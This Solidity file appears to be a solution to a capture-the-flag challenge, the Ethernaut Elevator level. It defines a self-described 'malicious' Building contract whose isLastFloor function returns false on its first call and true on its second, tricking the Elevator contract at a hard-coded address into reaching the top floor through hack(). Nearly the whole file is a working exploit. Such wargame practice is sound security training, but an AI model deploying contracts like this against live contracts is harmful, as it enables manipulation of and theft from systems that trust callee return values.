//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

//Creating my own malicious building contract.
//Our goal is to have building.isLastFloor() reesolve to false and then true within the same if block
//It can be achieved by setting a flag so first function call returns false then flag is set and second function
//call returns true.
contract Building {
    uint256 public lastFloor = 2;
    bool flag = false; //flag
    address elevatorContractAddress =
        0xd78caF66442EBb4b02528B5Dcc51fA6f012BD0Cb;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (_floor == lastFloor && flag) {
            return true;
        } else {
            flag = true; //set flag
            return false;
        }
    }

    function hack() public {
        IElevator(0xd78caF66442EBb4b02528B5Dcc51fA6f012BD0Cb).goTo(2);
    }
}
